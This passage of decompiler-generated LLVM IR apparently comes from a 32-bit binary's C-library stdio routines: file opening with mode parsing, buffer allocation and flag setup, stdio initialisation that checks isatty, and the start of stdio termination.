  %v10_804a36e = icmp eq i8 %v2_804a35f, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_804a36e, label %dec_label_pc_804a3a5, label %dec_label_pc_804a376

dec_label_pc_804a376:                             ; preds = %dec_label_pc_804a41e, %dec_label_pc_804a3f8, %dec_label_pc_804a36e
  %v0_804a376 = load i32, i32* %stack_var_-16, align 4
  %v1_804a376 = call i32 @__errno_location(i32 %v0_804a376)
  store i32 %v1_804a376, i32* %eax.global-to-local, align 4
  %v0_804a37b = load i32, i32* @ebp, align 4
  %v1_804a37b = icmp eq i32 %v0_804a37b, 0
  %v1_804a37d = inttoptr i32 %v1_804a376 to i32*
  store i32 22, i32* %v1_804a37d, align 4
  br i1 %v1_804a37b, label %dec_label_pc_804a57f, label %dec_label_pc_804a389

dec_label_pc_804a389:                             ; preds = %dec_label_pc_804a441, %dec_label_pc_804a376
  %v0_804a389 = load i32, i32* @ebp, align 4
  %v1_804a389 = add i32 %v0_804a389, 1
  %v2_804a389 = inttoptr i32 %v1_804a389 to i8*
  %v3_804a389 = load i8, i8* %v2_804a389, align 1
  %v4_804a389 = and i8 %v3_804a389, 32
  %v5_804a389 = icmp eq i8 %v4_804a389, 0
  br i1 %v5_804a389, label %dec_label_pc_804a57f, label %dec_label_pc_804a393

dec_label_pc_804a393:                             ; preds = %dec_label_pc_804a389
  store i32 %v0_804a389, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804a399 = call i32 @free(i32 %v0_804a389)
  br label %dec_label_pc_804a57a

dec_label_pc_804a3a3:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804a3a5

dec_label_pc_804a3a5:                             ; preds = %dec_label_pc_804a36e, %dec_label_pc_804a365, %dec_label_pc_804a3a3
  %v0_804a3b6 = phi i32 [ 1089, %dec_label_pc_804a36e ], [ 577, %dec_label_pc_804a365 ], [ 0, %dec_label_pc_804a3a3 ]
  %v1_804a3a5 = add i32 %v4_804a34f, 1
  %v2_804a3a5 = inttoptr i32 %v1_804a3a5 to i8*
  %v3_804a3a5 = load i8, i8* %v2_804a3a5, align 1
  %v12_804a3a5 = icmp eq i8 %v3_804a3a5, 98
  %v1_804a3a5.v4_804a34f = select i1 %v12_804a3a5, i32 %v1_804a3a5, i32 %v4_804a34f
  store i32 %v1_804a3a5.v4_804a34f, i32* %eax.global-to-local, align 4
  %v1_804a3b0 = add i32 %v1_804a3a5.v4_804a34f, 1
  %v2_804a3b0 = inttoptr i32 %v1_804a3b0 to i8*
  %v3_804a3b0 = load i8, i8* %v2_804a3b0, align 1
  %v12_804a3b0 = icmp eq i8 %v3_804a3b0, 43
  %v1_804a3b4 = icmp eq i1 %v12_804a3b0, false
  br i1 %v1_804a3b4, label %dec_label_pc_804a3be, label %dec_label_pc_804a3b6

dec_label_pc_804a3b6:                             ; preds = %dec_label_pc_804a3a5
  %v1_804a3b8 = or i32 %v0_804a3b6, 1
  store i32 %v1_804a3b8, i32* %eax.global-to-local, align 4
  %v1_804a3bb = add nuw nsw i32 %v1_804a3b8, 1
  store i32 %v1_804a3bb, i32* @ebx, align 4
  br label %dec_label_pc_804a3be

dec_label_pc_804a3be:                             ; preds = %dec_label_pc_804a3a5, %dec_label_pc_804a3b6
  %v0_804a4417 = phi i32 [ %v0_804a3b6, %dec_label_pc_804a3a5 ], [ %v1_804a3bb, %dec_label_pc_804a3b6 ]
  %v1_804a3be = icmp eq i32 %arg3, 0
  %v1_804a3c0 = icmp eq i1 %v1_804a3be, false
  br i1 %v1_804a3c0, label %dec_label_pc_804a3f4, label %dec_label_pc_804a3c2

dec_label_pc_804a3c2:                             ; preds = %dec_label_pc_804a3be
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804a3c7 = call i32 @malloc(i32 80)
  store i32 %v1_804a3c7, i32* %eax.global-to-local, align 4
  %v2_804a3cf = icmp eq i32 %v1_804a3c7, 0
  store i32 %v1_804a3c7, i32* @ebp, align 4
  br i1 %v2_804a3cf, label %dec_label_pc_804a581, label %dec_label_pc_804a3d9

dec_label_pc_804a3d9:                             ; preds = %dec_label_pc_804a3c2
  %v2_804a3c7 = inttoptr i32 %v1_804a3c7 to i16*
  store i16 8192, i16* %v2_804a3c7, align 2
  %v2_804a3e1 = add i32 %v1_804a3c7, 8
  %v3_804a3e1 = inttoptr i32 %v2_804a3e1 to i32*
  store i32 0, i32* %v3_804a3e1, align 4
  %v2_804a3e8 = add i32 %v1_804a3c7, 56
  store i32 %v2_804a3e8, i32* %eax.global-to-local, align 4
  store i32 %v2_804a3e8, i32* %stack_var_-76, align 4
  %v1_804a3ec = call i32 @__stdio_init_mutex(i32 %v2_804a3e8)
  store i32 %v1_804a3ec, i32* %eax.global-to-local, align 4
  %v0_804a441.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a3f4

dec_label_pc_804a3f4:                             ; preds = %dec_label_pc_804a3be, %dec_label_pc_804a3d9
  %v2_804a447 = phi i32 [ %v0_804a4417, %dec_label_pc_804a3be ], [ %v0_804a441.pre, %dec_label_pc_804a3d9 ]
  %v2_804a3f4 = icmp slt i32 %arg4, 0
  br i1 %v2_804a3f4, label %dec_label_pc_804a441, label %dec_label_pc_804a3f8

dec_label_pc_804a3f8:                             ; preds = %dec_label_pc_804a3f4
  %v1_804a3fa = and i32 %v2_804a447, 32771
  %v1_804a400 = add nuw nsw i32 %v1_804a3fa, 1
  store i32 %v1_804a400, i32* @edx, align 4
  %v0_804a401 = load i32, i32* @esi, align 4
  %v1_804a401 = add i32 %v0_804a401, 1
  %v2_804a404 = and i32 %v1_804a401, %v1_804a400
  store i32 %v2_804a404, i32* %eax.global-to-local, align 4
  %v12_804a406 = icmp eq i32 %v2_804a404, %v1_804a400
  %v1_804a408 = load i32, i32* @ebp, align 4
  %v2_804a408 = add i32 %v1_804a408, 4
  %v3_804a408 = inttoptr i32 %v2_804a408 to i32*
  store i32 %arg4, i32* %v3_804a408, align 4
  %v1_804a40b = icmp eq i1 %v12_804a406, false
  br i1 %v1_804a40b, label %dec_label_pc_804a376, label %dec_label_pc_804a411

dec_label_pc_804a411:                             ; preds = %dec_label_pc_804a3f8
  %v0_804a411 = load i32, i32* @esi, align 4
  %v1_804a413 = and i32 %v0_804a411, 1024
  %v1_804a415 = xor i32 %v1_804a413, 1024
  store i32 %v1_804a415, i32* %eax.global-to-local, align 4
  %v1_804a41a = load i32, i32* @ebx, align 4
  %v2_804a41a = and i32 %v1_804a41a, %v1_804a415
  %v3_804a41a = icmp eq i32 %v2_804a41a, 0
  br i1 %v3_804a41a, label %dec_label_pc_804a411.dec_label_pc_804a437_crit_edge, label %dec_label_pc_804a41e

dec_label_pc_804a411.dec_label_pc_804a437_crit_edge: ; preds = %dec_label_pc_804a411
  br label %dec_label_pc_804a437

dec_label_pc_804a41e:                             ; preds = %dec_label_pc_804a411
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v4_804a427 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024, i32 %v1_804a415)
  store i32 %v4_804a427, i32* %eax.global-to-local, align 4
  %v1_804a42f = icmp eq i32 %v4_804a427, 0
  %v1_804a431 = icmp eq i1 %v1_804a42f, false
  br i1 %v1_804a431, label %dec_label_pc_804a376, label %dec_label_pc_804a41e.dec_label_pc_804a437_crit_edge

dec_label_pc_804a41e.dec_label_pc_804a437_crit_edge: ; preds = %dec_label_pc_804a41e
  %v0_804a437.pre = load i32, i32* @esi, align 4
  %v0_804a43d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a437

dec_label_pc_804a437:                             ; preds = %dec_label_pc_804a411.dec_label_pc_804a437_crit_edge, %dec_label_pc_804a41e.dec_label_pc_804a437_crit_edge
  %v0_804a43d = phi i32 [ %v1_804a41a, %dec_label_pc_804a411.dec_label_pc_804a437_crit_edge ], [ %v0_804a43d.pre, %dec_label_pc_804a41e.dec_label_pc_804a437_crit_edge ]
  %v0_804a437 = phi i32 [ %v0_804a411, %dec_label_pc_804a411.dec_label_pc_804a437_crit_edge ], [ %v0_804a437.pre, %dec_label_pc_804a41e.dec_label_pc_804a437_crit_edge ]
  %v1_804a437 = and i32 %v0_804a437, 32768
  %v2_804a43d = or i32 %v1_804a437, %v0_804a43d
  store i32 %v2_804a43d, i32* @ebx, align 4
  br label %dec_label_pc_804a465

dec_label_pc_804a441:                             ; preds = %dec_label_pc_804a3f4
  %v11_804a443 = or i32 %v2_804a447, 32768
  store i32 %v11_804a443, i32* %eax.global-to-local, align 4
  %v1_804a446 = add i32 %arg4, 1
  %v8_804a446 = icmp eq i32 %v1_804a446, 0
  store i32 %v1_804a446, i32* @edi, align 4
  %v1_804a447 = icmp eq i1 %v8_804a446, false
  %v4_804a447 = select i1 %v1_804a447, i32 %v11_804a443, i32 %v2_804a447
  store i32 %v4_804a447, i32* @ebx, align 4
  %v0_804a451 = load i32, i32* @esi, align 4
  store i32 %v0_804a451, i32* %stack_var_-76, align 4
  %v3_804a452 = inttoptr i32 %v0_804a451 to i8*
  %v4_804a452 = call i32 @__libc_open(i8* %v3_804a452, i32 %v4_804a447, i32 438)
  store i32 %v4_804a452, i32* %eax.global-to-local, align 4
  %v2_804a45a = icmp slt i32 %v4_804a452, 0
  %v1_804a45c = load i32, i32* @ebp, align 4
  %v2_804a45c = add i32 %v1_804a45c, 4
  %v3_804a45c = inttoptr i32 %v2_804a45c to i32*
  store i32 %v4_804a452, i32* %v3_804a45c, align 4
  br i1 %v2_804a45a, label %dec_label_pc_804a389, label %dec_label_pc_804a465

dec_label_pc_804a465:                             ; preds = %dec_label_pc_804a441, %dec_label_pc_804a437
  %v0_804a465 = load i32, i32* @ebp, align 4
  %v1_804a465 = inttoptr i32 %v0_804a465 to i32*
  %v2_804a465 = load i32, i32* %v1_804a465, align 4
  %v2_804a465.tr = trunc i32 %v2_804a465 to i16
  %v1_804a46d = and i16 %v2_804a465.tr, 8192
  %v3_804a46d = inttoptr i32 %v0_804a465 to i16*
  store i16 %v1_804a46d, i16* %v3_804a46d, align 2
  %v0_804a471 = load i32, i32* @ebx, align 4
  store i32 %v0_804a471, i32* %eax.global-to-local, align 4
  %v1_804a473 = and i32 %v0_804a471, -31744
  %v0_804a479 = load i32, i32* @ebp, align 4
  %v1_804a479 = inttoptr i32 %v0_804a479 to i32*
  %v2_804a479 = load i32, i32* %v1_804a479, align 4
  %v1_804a47c = mul i32 %v0_804a471, 16
  %v1_804a47f = and i32 %v1_804a47c, 48
  %v1_804a480 = add nuw nsw i32 %v1_804a47f, 16
  %v2_804a483 = xor i32 %v1_804a480, 48
  %v2_804a486 = or i32 %v2_804a479, %v1_804a473
  %v2_804a488 = or i32 %v2_804a486, %v2_804a483
  store i32 %v2_804a488, i32* %eax.global-to-local, align 4
  %v1_804a48a = trunc i32 %v2_804a488 to i16
  %v3_804a48a = inttoptr i32 %v0_804a479 to i16*
  store i16 %v1_804a48a, i16* %v3_804a48a, align 2
  %v0_804a48e = load i32, i32* %stack_var_-76, align 4
  %v1_804a48e = call i32 @__errno_location(i32 %v0_804a48e)
  store i32 %v1_804a48e, i32* %eax.global-to-local, align 4
  %v0_804a496 = load i32, i32* @ebp, align 4
  %v1_804a496 = inttoptr i32 %v0_804a496 to i16*
  %v2_804a496 = load i16, i16* %v1_804a496, align 2
  %v3_804a496 = zext i16 %v2_804a496 to i32
  store i32 %v3_804a496, i32* @ebx, align 4
  %v1_804a49a = inttoptr i32 %v1_804a48e to i32*
  %v2_804a49a = load i32, i32* %v1_804a49a, align 4
  store i32 %v2_804a49a, i32* @edi, align 4
  store i32 %v1_804a48e, i32* @esi, align 4
  %v1_804a49e = add i32 %v0_804a496, 4
  %v2_804a49e = inttoptr i32 %v1_804a49e to i32*
  %v3_804a49e = load i32, i32* %v2_804a49e, align 4
  store i32 %v3_804a49e, i32* %stack_var_-76, align 4
  %v1_804a4a1 = call i32 @isatty(i32 %v3_804a49e)
  %v2_804a4a9 = mul i32 %v1_804a4a1, 256
  store i32 %v2_804a4a9, i32* %eax.global-to-local, align 4
  %v0_804a4ac = load i32, i32* @ebx, align 4
  %v2_804a4ac = or i32 %v0_804a4ac, %v2_804a4a9
  store i32 %v2_804a4ac, i32* @ebx, align 4
  %v1_804a4ae = trunc i32 %v2_804a4ac to i16
  %v2_804a4ae = load i32, i32* @ebp, align 4
  %v3_804a4ae = inttoptr i32 %v2_804a4ae to i16*
  store i16 %v1_804a4ae, i16* %v3_804a4ae, align 2
  %v0_804a4b2 = load i32, i32* @edi, align 4
  %v1_804a4b2 = load i32, i32* @esi, align 4
  %v2_804a4b2 = inttoptr i32 %v1_804a4b2 to i32*
  store i32 %v0_804a4b2, i32* %v2_804a4b2, align 4
  %v0_804a4b4 = load i32, i32* @ebp, align 4
  %v1_804a4b4 = add i32 %v0_804a4b4, 8
  %v2_804a4b4 = inttoptr i32 %v1_804a4b4 to i32*
  %v3_804a4b4 = load i32, i32* %v2_804a4b4, align 4
  %v4_804a4b4 = icmp eq i32 %v3_804a4b4, 0
  %v1_804a4b8 = icmp eq i1 %v4_804a4b4, false
  br i1 %v1_804a4b8, label %dec_label_pc_804a4ec, label %dec_label_pc_804a4ba

dec_label_pc_804a4ba:                             ; preds = %dec_label_pc_804a465
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804a4c2 = call i32 @malloc(i32 4096)
  store i32 %v1_804a4c2, i32* %eax.global-to-local, align 4
  %v1_804a4ca = icmp eq i32 %v1_804a4c2, 0
  %v1_804a4cc = load i32, i32* @ebp, align 4
  %v2_804a4cc = add i32 %v1_804a4cc, 8
  %v3_804a4cc = inttoptr i32 %v2_804a4cc to i32*
  store i32 %v1_804a4c2, i32* %v3_804a4cc, align 4
  br i1 %v1_804a4ca, label %dec_label_pc_804a4e5, label %dec_label_pc_804a4d1

dec_label_pc_804a4d1:                             ; preds = %dec_label_pc_804a4ba
  %v1_804a4d1 = add i32 %v1_804a4c2, 4096
  store i32 %v1_804a4d1, i32* %eax.global-to-local, align 4
  %v1_804a4d6 = load i32, i32* @ebp, align 4
  %v2_804a4d6 = add i32 %v1_804a4d6, 12
  %v3_804a4d6 = inttoptr i32 %v2_804a4d6 to i32*
  store i32 %v1_804a4d1, i32* %v3_804a4d6, align 4
  %v0_804a4d9 = load i32, i32* @ebp, align 4
  %v1_804a4d9 = inttoptr i32 %v0_804a4d9 to i32*
  %v2_804a4d9 = load i32, i32* %v1_804a4d9, align 4
  %v1_804a4dc = udiv i32 %v2_804a4d9, 256
  %v3_804a4dc = and i32 %v1_804a4dc, 191
  %v8_804a4dc = or i32 %v3_804a4dc, 64
  %v10_804a4dc = mul nuw nsw i32 %v8_804a4dc, 256
  %v11_804a4dc = and i32 %v2_804a4d9, -65281
  %v12_804a4dc = or i32 %v10_804a4dc, %v11_804a4dc
  store i32 %v12_804a4dc, i32* %eax.global-to-local, align 4
  %v1_804a4df = trunc i32 %v12_804a4dc to i16
  %v3_804a4df = inttoptr i32 %v0_804a4d9 to i16*
  store i16 %v1_804a4df, i16* %v3_804a4df, align 2
  br label %dec_label_pc_804a4ec

dec_label_pc_804a4e5:                             ; preds = %dec_label_pc_804a4ba
  %v0_804a4e5 = load i32, i32* @ebp, align 4
  %v1_804a4e5 = add i32 %v0_804a4e5, 12
  %v2_804a4e5 = inttoptr i32 %v1_804a4e5 to i32*
  store i32 0, i32* %v2_804a4e5, align 4
  br label %dec_label_pc_804a4ec

dec_label_pc_804a4ec:                             ; preds = %dec_label_pc_804a465, %dec_label_pc_804a4d1, %dec_label_pc_804a4e5
  %v0_804a4ec = load i32, i32* @ebp, align 4
  %v1_804a4ec = add i32 %v0_804a4ec, 8
  %v2_804a4ec = inttoptr i32 %v1_804a4ec to i32*
  %v3_804a4ec = load i32, i32* %v2_804a4ec, align 4
  store i32 %v3_804a4ec, i32* %eax.global-to-local, align 4
  %v1_804a4ef = add i32 %v0_804a4ec, 2
  %v2_804a4ef = inttoptr i32 %v1_804a4ef to i8*
  store i8 0, i8* %v2_804a4ef, align 1
  %v0_804a4f3 = load i32, i32* @ebp, align 4
  %v1_804a4f3 = add i32 %v0_804a4f3, 44
  %v2_804a4f3 = inttoptr i32 %v1_804a4f3 to i32*
  store i32 0, i32* %v2_804a4f3, align 4
  %v0_804a4fa = load i32, i32* @ebp, align 4
  %v1_804a4fa = add i32 %v0_804a4fa, 1
  %v2_804a4fa = inttoptr i32 %v1_804a4fa to i8*
  %v3_804a4fa = load i8, i8* %v2_804a4fa, align 1
  %v4_804a4fa = and i8 %v3_804a4fa, 32
  %v5_804a4fa = icmp eq i8 %v4_804a4fa, 0
  %v0_804a4fe = load i32, i32* %eax.global-to-local, align 4
  %v2_804a4fe = add i32 %v0_804a4fa, 24
  %v3_804a4fe = inttoptr i32 %v2_804a4fe to i32*
  store i32 %v0_804a4fe, i32* %v3_804a4fe, align 4
  %v0_804a501 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a501 = load i32, i32* @ebp, align 4
  %v2_804a501 = add i32 %v1_804a501, 28
  %v3_804a501 = inttoptr i32 %v2_804a501 to i32*
  store i32 %v0_804a501, i32* %v3_804a501, align 4
  %v0_804a504 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a504 = load i32, i32* @ebp, align 4
  %v2_804a504 = add i32 %v1_804a504, 16
  %v3_804a504 = inttoptr i32 %v2_804a504 to i32*
  store i32 %v0_804a504, i32* %v3_804a504, align 4
  %v0_804a507 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a507 = load i32, i32* @ebp, align 4
  %v2_804a507 = add i32 %v1_804a507, 20
  %v3_804a507 = inttoptr i32 %v2_804a507 to i32*
  store i32 %v0_804a507, i32* %v3_804a507, align 4
  %v0_804a50a = load i32, i32* @global_var_8053508.316, align 8
  store i32 %v0_804a50a, i32* @eax, align 4
  %v1_804a50f = load i32, i32* @ebp, align 4
  %v2_804a50f = add i32 %v1_804a50f, 52
  %v3_804a50f = inttoptr i32 %v2_804a50f to i32*
  store i32 %v0_804a50a, i32* %v3_804a50f, align 4
  br i1 %v5_804a4fa, label %dec_label_pc_804a581, label %dec_label_pc_804a514

dec_label_pc_804a514:                             ; preds = %dec_label_pc_804a4ec
  %v2_804a51f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804a51f, i32* %stack_var_-76, align 4
  %v2_804a524 = call i32 @__pthread_return_void(i32 %v2_804a51f, i32 134535499)
  store i32 %v2_804a524, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80534f0.313 to i32), i32* %stack_var_-76, align 4
  %v1_804a530 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80534f0.313 to i32))
  store i32 %v1_804a530, i32* @eax, align 4
  %v2_804a542 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804a542, i32* %stack_var_-76, align 4
  %v2_804a547 = call i32 @__pthread_return_void(i32 %v2_804a542, i32 134535499)
  store i32 %v2_804a547, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80534d8.317 to i32), i32* %stack_var_-76, align 4
  %v1_804a553 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80534d8.317 to i32))
  %v0_804a558 = load i32, i32* bitcast (i32** @global_var_80534d4.318 to i32*), align 4
  store i32 %v0_804a558, i32* @eax, align 4
  %v1_804a55d = load i32, i32* @ebp, align 4
  %v2_804a55d = add i32 %v1_804a55d, 32
  %v3_804a55d = inttoptr i32 %v2_804a55d to i32*
  store i32 %v0_804a558, i32* %v3_804a55d, align 4
  %v2_804a560 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804a560, i32* @ecx, align 4
  %v0_804a561 = load i32, i32* @ebp, align 4
  store i32 %v0_804a561, i32* bitcast (i32** @global_var_80534d4.318 to i32*), align 4
  store i32 %v2_804a542, i32* %stack_var_-76, align 4
  %v2_804a56b = call i32 @__pthread_return_void(i32 %v2_804a542, i32 1)
  store i32 %v2_804a542, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804a51f, i32* %stack_var_-76, align 4
  %v2_804a575 = call i32 @__pthread_return_void(i32 %v2_804a51f, i32 1)
  br label %dec_label_pc_804a57a

dec_label_pc_804a57a:                             ; preds = %dec_label_pc_804a393, %dec_label_pc_804a514
  %storemerge = phi i32 [ %v2_804a575, %dec_label_pc_804a514 ], [ %v1_804a399, %dec_label_pc_804a393 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a581

dec_label_pc_804a57f:                             ; preds = %dec_label_pc_804a389, %dec_label_pc_804a376
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804a581

dec_label_pc_804a581:                             ; preds = %dec_label_pc_804a4ec, %dec_label_pc_804a3c2, %dec_label_pc_804a57a, %dec_label_pc_804a57f
  %v0_804a584 = load i32, i32* @ebp, align 4
  store i32 %v0_804a584, i32* %eax.global-to-local, align 4
  %v2_804a586 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804a586, i32* @ebx, align 4
  store i32 %v0_804a34a, i32* @esi, align 4
  store i32 %v0_804a349, i32* @edi, align 4
  store i32 %v0_804a348, i32* @ebp, align 4
  ret i32 %v0_804a584

; uselistorder directives
  uselistorder i32 %v2_804a542, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804a51f, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804a4d9, { 1, 0 }
  uselistorder i32 %v1_804a4c2, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804a4a9, { 1, 0 }
  uselistorder i32 %v1_804a48e, { 1, 0, 2 }
  uselistorder i32 %v11_804a443, { 1, 0 }
  uselistorder i32 %v1_804a415, { 2, 1, 0 }
  uselistorder i32 %v0_804a411, { 1, 0 }
  uselistorder i32 %v2_804a447, { 1, 0, 2 }
  uselistorder i32 %v1_804a3c7, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 27, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25 }
  uselistorder i32 %arg4, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_804a581, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804a57a, { 1, 0 }
  uselistorder label %dec_label_pc_804a4ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a437, { 1, 0 }
  uselistorder label %dec_label_pc_804a3f4, { 1, 0 }
  uselistorder label %dec_label_pc_804a3be, { 1, 0 }
  uselistorder label %dec_label_pc_804a3a5, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804a58d = load i32, i32* @edi, align 4
  %v0_804a58e = load i32, i32* @esi, align 4
  %v0_804a58f = load i32, i32* @ebx, align 4
  store i32 %v0_804a58f, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804a598 = call i32 @__errno_location(i32 %v0_804a58f)
  %v0_804a5a0 = load i16, i16* @global_var_8053520.309, align 32
  %v1_804a5a0 = zext i16 %v0_804a5a0 to i32
  store i32 %v1_804a5a0, i32* @esi, align 4
  %v1_804a5a7 = inttoptr i32 %v1_804a598 to i32*
  %v2_804a5a7 = load i32, i32* %v1_804a5a7, align 4
  store i32 %v2_804a5a7, i32* %ebp.global-to-local, align 4
  store i32 %v1_804a598, i32* @edi, align 4
  %v1_804a5ad = call i32 @isatty(i32 0)
  %v0_804a5b2 = load i32, i32* @ebx, align 4
  %v2_804a5bb = sub i32 %v0_804a5b2, %v1_804a5ad
  %v2_804a5bf = mul i32 %v2_804a5bb, 256
  %v0_804a5c2 = load i32, i32* @esi, align 4
  %v2_804a5c2 = xor i32 %v0_804a5c2, %v2_804a5bf
  %v1_804a5c4 = trunc i32 %v2_804a5c2 to i16
  store i16 %v1_804a5c4, i16* @global_var_8053520.309, align 32
  %v0_804a5cb = load i16, i16* @global_var_8053570.310, align 16
  %v1_804a5cb = zext i16 %v0_804a5cb to i32
  store i32 %v1_804a5cb, i32* @esi, align 4
  %v1_804a5d2 = call i32 @isatty(i32 1)
  %v0_804a5d7 = load i32, i32* @ebx, align 4
  %v2_804a5d7 = sub i32 %v0_804a5d7, %v1_804a5d2
  %v2_804a5d9 = mul i32 %v2_804a5d7, 256
  %v0_804a5dc = load i32, i32* @esi, align 4
  %v2_804a5dc = xor i32 %v2_804a5d9, %v0_804a5dc
  %v1_804a5de = trunc i32 %v2_804a5dc to i16
  store i16 %v1_804a5de, i16* @global_var_8053570.310, align 16
  %v0_804a5e5 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804a5e5 = load i32, i32* @edi, align 4
  %v2_804a5e5 = inttoptr i32 %v1_804a5e5 to i32*
  store i32 %v0_804a5e5, i32* %v2_804a5e5, align 4
  %v2_804a5ea = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804a5ea, i32* @ebx, align 4
  store i32 %v0_804a58e, i32* @esi, align 4
  store i32 %v0_804a58d, i32* @edi, align 4
  ret i32 %v1_804a5d2

; uselistorder directives
  uselistorder i32 %v1_804a598, { 1, 0 }
  uselistorder i16* @global_var_8053570.310, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804a5fd = inttoptr i32 %arg1 to i16*
  %v4_804a5fd = call i32 @memcpy(i16* %v3_804a5fd, i32 ptrtoint (i32* @global_var_80517c0.319 to i32), i32 24)
  ret i32 %v4_804a5fd
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804a606 = load i32, i32* @esi, align 4
  %v0_804a607 = load i32, i32* @ebx, align 4
  store i32 %v0_804a607, i32* %stack_var_-8, align 4
  %v1_804a610 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80534d8.317 to i32))
  store i32 %v1_804a610, i32* %eax.global-to-local, align 4
  %v1_804a61c = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80534f0.313 to i32))
  store i32 %v1_804a61c, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_80534d4.318 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804a66622 = icmp eq i32 %storemerge21, 0
  %v1_804a66824 = icmp eq i1 %v1_804a66622, false
  br i1 %v1_804a66824, label %dec_label_pc_804a629.lr.ph, label %dec_label_pc_804a686.preheader

dec_label_pc_804a629.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804a629

dec_label_pc_804a629:                             ; preds = %dec_label_pc_804a629.lr.ph, %dec_label_pc_804a650
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_804a629.lr.ph ], [ %storemerge, %dec_label_pc_804a650 ]
  %v1_804a62c = add i32 %storemerge25, 56
  store i32 %v1_804a62c, i32* @esi, align 4
  %v1_804a630 = call i32 @__pthread_return_0(i32 %v1_804a62c)
  store i32 %v1_804a630, i32* %eax.global-to-local, align 4
  %v1_804a638 = icmp eq i32 %v1_804a630, 0
  br i1 %v1_804a638, label %dec_label_pc_804a650, label %dec_label_pc_804a63c

dec_label_pc_804a63c:                             ; preds = %dec_label_pc_804a629
  %v0_804a63c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a63c = add i32 %v0_804a63c, 8
  %v2_804a63c = inttoptr i32 %v1_804a63c to i32*
  %v3_804a63c = load i32, i32* %v2_804a63c, align 4
  store i32 %v3_804a63c, i32* %eax.global-to-local, align 4
  %v1_804a63f = inttoptr i32 %v0_804a63c to i16*
  store i16 48, i16* %v1_804a63f, align 2
  %v0_804a644 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a644 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a644 = add i32 %v1_804a644, 24
  %v3_804a644 = inttoptr i32 %v2_804a644 to i32*
  store i32 %v0_804a644, i32* %v3_804a644, align 4
  %v0_804a647 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a647 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a647 = add i32 %v1_804a647, 28
  %v3_804a647 = inttoptr i32 %v2_804a647 to i32*
  store i32 %v0_804a647, i32* %v3_804a647, align 4
  %v0_804a64a = load i32, i32* %eax.global-to-local, align 4
  %v1_804a64a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a64a = add i32 %v1_804a64a, 16
  %v3_804a64a = inttoptr i32 %v2_804a64a to i32*
  store i32 %v0_804a64a, i32* %v3_804a64a, align 4
  %v0_804a64d = load i32, i32* %eax.global-to-local, align 4
  %v1_804a64d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a64d = add i32 %v1_804a64d, 20
  %v3_804a64d = inttoptr i32 %v2_804a64d to i32*
  store i32 %v0_804a64d, i32* %v3_804a64d, align 4
  br label %dec_label_pc_804a650

dec_label_pc_804a650:                             ; preds = %dec_label_pc_804a629, %dec_label_pc_804a63c
  %v0_804a653 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a653 = add i32 %v0_804a653, 52
  %v2_804a653 = inttoptr i32 %v1_804a653 to i32*
  store i32 1, i32* %v2_804a653, align 4
  %v0_804a65a = load i32, i32* @esi, align 4
  %v1_804a65b = call i32 @__stdio_init_mutex(i32 %v0_804a65a)
